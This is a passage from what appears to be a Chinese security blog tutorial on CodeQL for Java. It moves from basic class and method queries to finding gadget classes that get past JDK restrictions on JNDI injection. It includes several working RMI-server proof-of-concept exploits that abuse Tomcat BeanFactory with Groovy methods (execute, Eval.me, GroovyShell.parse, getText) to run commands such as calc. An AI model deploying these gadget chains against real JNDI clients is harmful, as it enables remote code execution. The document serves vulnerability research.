<p>据的构建过程中，<code>codeql</code>并不需要完整的去编译源代码，只是借助<code>javac</code>从源码中那拿点东西。其次，只要能够根据源码文件构造正确的<code>javac.args</code>，就可以生成<code>trap</code>文件了。之后再通过<code>codeql database finalize</code>即可得到一个数据库。</p>
<h2 id="如何对类进行限制"><a href="#如何对类进行限制" class="headerlink" title="如何对类进行限制"></a>如何对类进行限制</h2><p>项目数据库：<a target="_blank" rel="noopener" href="https://github.com/githubsatelliteworkshops/codeql/releases/download/v1.0/apache_struts_cve_2017_9805.zip">https://github.com/githubsatelliteworkshops/codeql/releases/download/v1.0/apache_struts_cve_2017_9805.zip</a></p>
<p>内含源码和已经生成好的ql数据库，直接导入即可。</p>
<h3 id="RefType"><a href="#RefType" class="headerlink" title="RefType"></a>RefType</h3><p>相关使用文档：<a target="_blank" rel="noopener" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/type.Type$RefType.html">https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/type.Type$RefType.html</a></p>
<blockquote>
<p>getACallable() 获取所有可以调用方法(其中包括构造方法)<br>getAMember() 获取所有成员，其中包括调用方法，字段和内部类这些<br>getAField() 获取所有字段<br>getAMethod() 获取所有方法<br>getASupertype() 获取父类<br>getAnAncestor() 获取所有的父类相当于递归的getASupertype*()</p>
</blockquote>
<p><code>RefType</code>包含了我们在Java里面使用到的<code>Class</code>,<code>Interface</code>的声明，比如我们现在需要查询一个类名为<code>XStreamHandler</code>的类，但是我们不确定他是<code>Class</code>还是<code>Interface</code>，我们就可以通过 <code>RefType</code>定义变量后进行查询</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java

<span class="token keyword">from</span> RefType c
<span class="token keyword">where</span> c<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"XStreamHandler"</span><span class="token punctuation">)</span>
<span class="token keyword">select</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Callable"><a href="#Callable" class="headerlink" title="Callable"></a>Callable</h3><p>在CodeQL中，Java的方法限制，我们可以使用<code>Callable</code>，<code>Callable</code>的父类是 <code>Method</code> 和 <code>Constructor</code></p>
<p><code>Callable</code>常使用的谓词：<br><a target="_blank" rel="noopener" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/type.Member$Callable.html">https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/type.Member$Callable.html</a></p>
<blockquote>
<p>polyCalls(Callable target) 一个Callable 是否调用了另外的Callable，这里面包含了类似虚函数的调用<br>hasName(name) 可以对方法名进行限制</p>
</blockquote>
<p>结合<code>RefType</code>寻找<code>XStreamHandler</code>类/接口中定义的<code>fromObject</code>方法：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java

<span class="token keyword">from</span> RefType c<span class="token punctuation">,</span> Callable cf
<span class="token keyword">where</span>
  c<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"XStreamHandler"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
  cf<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"fromObject"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
  cf <span class="token operator">=</span> c<span class="token punctuation">.</span>getACallable<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">select</span> c<span class="token punctuation">,</span> cf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2022/07/11/5bCBHzhUAs9DvWS.png" alt="image-20220616140621842"></p>
<h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p>之前的<code>Callable</code>是寻找类的定义/构造方法，对于方法的调用，我们可以用<code>call</code>来实现。<code>call</code>的父类包括<code>MethodAccess</code>, <code>ClassInstanceExpression</code>, <code>ThisConstructorInvocationStmt</code> 和 <code>SuperConstructorInvocationStmt</code></p>
<p><code>Call</code>中常使用的谓词：<br><a target="_blank" rel="noopener" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$Call.html">https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$Call.html</a></p>
<blockquote>
<p>getCallee() 返回函数声明的位置<br>getCaller() 返回调用这个函数的函数位置</p>
</blockquote>
<p>我们需要查询哪些地方调用了<code>XStream.fromXML</code>，可以这样构建ql语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java

<span class="token keyword">from</span> MethodAccess c<span class="token punctuation">,</span> Callable cb
<span class="token keyword">where</span>
  cb<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"fromXML"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
  cb<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"com.thoughtworks.xstream"</span><span class="token punctuation">,</span> <span class="token string">"XStream"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
  c<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> cb
<span class="token keyword">select</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2022/07/11/5pUDPJ96ctNGYqV.png" alt="image-20220616141100694"></p>
<h2 id="codeql-with-JNDI-RMI"><a href="#codeql-with-JNDI-RMI" class="headerlink" title="codeql with JNDI RMI"></a>codeql with JNDI RMI</h2><p>reference:<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p>
<p>本文下测试环境为jdk1.8.0_333</p>
<p>之前写过相关的文章，这里只聚焦于突破高版本对于JNDI注入的限制。我们整理一下能利用的类需要满足的条件：</p>
<ul>
<li>此类有public修饰的无参构造方法</li>
<li>此类有public修饰的包含sink方法，其参数只有一个String型</li>
</ul>
<p>根据两个条件我们来构造ql查询语句：</p>
<p>看起来不是很难。我们尝试构造一下：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java
class UsableClass extends RefType {
    UsableClass<span class="token punctuation">(</span><span class="token punctuation">)</span> {
        this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAConstructor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>
    }
}

class UsableMethod extends Method {
    UsableMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {
        this<span class="token punctuation">.</span>getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token operator">and</span> this<span class="token punctuation">.</span>getAParamType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"String"</span><span class="token punctuation">)</span>
        <span class="token operator">and</span> this<span class="token punctuation">.</span>isPublic<span class="token punctuation">(</span><span class="token punctuation">)</span>
    }
}

<span class="token keyword">from</span> UsableMethod me<span class="token punctuation">,</span> UsableClass cla
<span class="token keyword">where</span>
    me<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> cla
<span class="token keyword">select</span> cla<span class="token punctuation">,</span>me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>找到的可利用点：</p>
<h3 id="groovy"><a href="#groovy" class="headerlink" title="groovy"></a>groovy</h3><h4 id="RCE-addClasspath-amp-amp-loadClass"><a href="#RCE-addClasspath-amp-amp-loadClass" class="headerlink" title="RCE:addClasspath&amp;&amp;loadClass"></a>RCE:addClasspath&amp;&amp;loadClass</h4><p><img src="https://s2.loli.net/2022/07/11/NCwU2KzqLPeSmvD.png" alt="image-20220628193424951"></p>
<h4 id="RCE-execute"><a href="#RCE-execute" class="headerlink" title="RCE:execute"></a>RCE:execute</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.codehaus.groovy.runtime.ProcessGroovyMethods"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=execute"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2022/07/11/ao1AEuk7OHWMN2d.png" alt="image-20220629093146483"></p>
<h4 id="RCE-me"><a href="#RCE-me" class="headerlink" title="RCE:me"></a>RCE:me</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.util.Eval"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=me"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"\"calc\".execute()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2022/07/11/MqjK8JXZO3gV2fi.png" alt="image-20220629101318838"></p>
<p>这个方法名如此人畜无害，单从方法名来看很难联想到能RCE。我们调试一下：</p>
<p>进入<code>Eval#me</code>中，此时该方法仅有的String参数为我们传入的<code>"calc.execute()"</code></p>
<p>调用下面的<code>me</code>，将前两个参数置为<code>null</code>，实例化一个<code>GroovyShell</code>–&gt;<code>sh</code>，进入<code>sh.evaluate</code>中</p>
<p><img src="/codeql_for_java.assets/image-20220629114200937.png" alt="image-20220629114200937"></p>
<p>接着跟入<code>sh.evaluate</code>：</p>
<p>一系列调用后指定<code>codeBase</code>为<code>/groovy/shell</code>，包装好后实例化为<code>gcs</code></p>
<p><img src="https://s2.loli.net/2022/07/11/m7pgvBoAkxetqCE.png" alt="image-20220629115450341"></p>
<p>跟入<code>this.evaluate(gcs)</code>：</p>
<p><img src="https://s2.loli.net/2022/07/11/d3M6ksNE1bQawG5.png" alt="image-20220629135440322"></p>
<p><code>parse</code>方法处理后调用<code>script.run();</code>运行groovy脚本。最终也是走到了<code>execute</code>，也就是之前提过的利用方式。</p>
<h4 id="RCE-parse"><a href="#RCE-parse" class="headerlink" title="RCE:parse"></a>RCE:parse</h4><p>在这里会调用<code>parseClass</code>，所以poc和<code>parseClass</code>利用一样。之前几步的处理过程很好理解此处就不多水字了。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.lang.GroovyShell"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=parse"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"calc\")\n})\ndef m1yuu\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2022/07/11/cmyLEuiC5af71Qr.png" alt="image-20220629163409700"></p>
<h4 id="RCE-parseClass"><a href="#RCE-parseClass" class="headerlink" title="RCE:parseClass"></a>RCE:parseClass</h4><p>这个网上很多文章都提到了，就不再赘述。</p>
<h4 id="URL探测-getText"><a href="#URL探测-getText" class="headerlink" title="URL探测:getText"></a>URL探测:getText</h4><p><img src="https://s2.loli.net/2022/07/11/On2VSphFBEC8rjZ.png" alt="image-20220629091224537"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.ui.GroovyMain"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=getText"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:8000"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用python起个简易httpserver：</p>
<p><img src="https://s2.loli.net/2022/07/11/eS2fKXao6FkvcsU.png" alt="image-20220629091810108"></p>
<h3 id="MVEL"><a href="#MVEL" class="headerlink" title="MVEL"></a>MVEL</h3><h4 id="RCE-exec"><a href="#RCE-exec" class="headerlink" title="RCE:exec"></a>RCE:exec</h4><p>此处利用点浅蓝师傅已经找到了，这里复现一下：</p>
<p><img src="/codeql_for_java.assets/image-20220630141615337.png" alt="image-20220630141615337"></p>
<p><img src="https://s2.loli.net/2022/07/11/tZj3zhkxP6OAGuo.png" alt="image-20220630144501270"></p>
